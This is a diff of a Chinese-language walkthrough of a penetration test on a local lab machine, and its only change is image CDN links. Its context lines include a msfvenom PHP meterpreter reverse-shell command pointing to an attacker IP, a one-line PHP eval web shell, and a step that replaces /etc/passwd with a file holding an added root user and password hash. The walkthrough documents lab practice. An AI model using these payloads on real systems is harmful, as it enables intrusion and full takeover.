@@ -73,7 +73,7 @@ Target: http://192.168.56.15:8080/public/
 
 访问各个web目录,如下
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9287f5ad2764d3e4972692cb1ec023de.png" alt="9287f5ad2764d3e4972692cb1ec023de.png" width="885" height="528" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/53e64311e9988394fe99f638c42aef1c.png" alt="53e64311e9988394fe99f638c42aef1c.png" width="867" height="395" class="jop-noMdConv"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/bb7d7fb95ebc0adc10689b4abed38a25.png" alt="bb7d7fb95ebc0adc10689b4abed38a25.png" width="797" height="439" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9287f5ad2764d3e4972692cb1ec023de.png" alt="9287f5ad2764d3e4972692cb1ec023de.png" width="885" height="528" class="jop-noMdConv"> <img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/53e64311e9988394fe99f638c42aef1c.png" alt="53e64311e9988394fe99f638c42aef1c.png" width="867" height="395" class="jop-noMdConv"><img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/bb7d7fb95ebc0adc10689b4abed38a25.png" alt="bb7d7fb95ebc0adc10689b4abed38a25.png" width="797" height="439" class="jop-noMdConv">
 
 没有发现有价值的信息
 
@@ -217,15 +217,15 @@ For more enquiries, please log into the CMS using the correct magic word: goodte
 
 访问http://192.168.56.15/devops/directortestpagev1.php
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/54a44f54c9ff21fd31d3746ac89840cb.png" alt="54a44f54c9ff21fd31d3746ac89840cb.png" width="992" height="212" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/54a44f54c9ff21fd31d3746ac89840cb.png" alt="54a44f54c9ff21fd31d3746ac89840cb.png" width="992" height="212" class="jop-noMdConv">
 
 访问http://192.168.254.155/genevieve --\>  http://192.168.56.15/genevieve
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/6850429da6ab493a6643ded72e2e568a.png" alt="6850429da6ab493a6643ded72e2e568a.png" width="971" height="655" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/6850429da6ab493a6643ded72e2e568a.png" alt="6850429da6ab493a6643ded72e2e568a.png" width="971" height="655" class="jop-noMdConv">
 
 继续访问该站点，发现该站点为cuppaCMS
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9d345ebc9c20af949ef665a458c90767.png" alt="9d345ebc9c20af949ef665a458c90767.png" width="934" height="439" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9d345ebc9c20af949ef665a458c90767.png" alt="9d345ebc9c20af949ef665a458c90767.png" width="934" height="439" class="jop-noMdConv">
 
 * * *
 
@@ -358,7 +358,7 @@ msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.56.123 lport=4444 -f raw >
 
 成功获取到shell
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/86335f5a32486fdcb09cb011adeb5253.png" alt="86335f5a32486fdcb09cb011adeb5253.png" width="933" height="510" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/86335f5a32486fdcb09cb011adeb5253.png" alt="86335f5a32486fdcb09cb011adeb5253.png" width="933" height="510" class="jop-noMdConv">
 
 接下来尝试提权，该主机为linux，那么尝试进习惯SUID提权
 
@@ -474,17 +474,17 @@ cat hack.php
 <?php @eval($_POST[cmd]);?>
 ```
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/610f6f7b3b2ed6e0fbb95a07bb789f29.png" alt="610f6f7b3b2ed6e0fbb95a07bb789f29.png" width="1062" height="281" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/610f6f7b3b2ed6e0fbb95a07bb789f29.png" alt="610f6f7b3b2ed6e0fbb95a07bb789f29.png" width="1062" height="281" class="jop-noMdConv">
 
 制作一个passwd文件，其中内容为靶机的passwd文件，并将做好的root身份用户添加至passwd文件末尾，上传至靶机然后cp替代靶机的/etc/passwd文件
 
 制作的用户为`sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash`
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8c894480caeb99dac32a2f501f433ad5.png" alt="8c894480caeb99dac32a2f501f433ad5.png" width="972" height="349" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8c894480caeb99dac32a2f501f433ad5.png" alt="8c894480caeb99dac32a2f501f433ad5.png" width="972" height="349" class="jop-noMdConv">
 
 最后成功提权
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/23a904f907c03a6807414c6d5d2c4455.png" alt="23a904f907c03a6807414c6d5d2c4455.png" width="962" height="768" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8b4e596af7da646be8fb1456be2c657e.png" alt="8b4e596af7da646be8fb1456be2c657e.png" width="840" height="584" class="jop-noMdConv">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/23a904f907c03a6807414c6d5d2c4455.png" alt="23a904f907c03a6807414c6d5d2c4455.png" width="962" height="768" class="jop-noMdConv"> <img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8b4e596af7da646be8fb1456be2c657e.png" alt="8b4e596af7da646be8fb1456be2c657e.png" width="840" height="584" class="jop-noMdConv">
 
 * * *
 
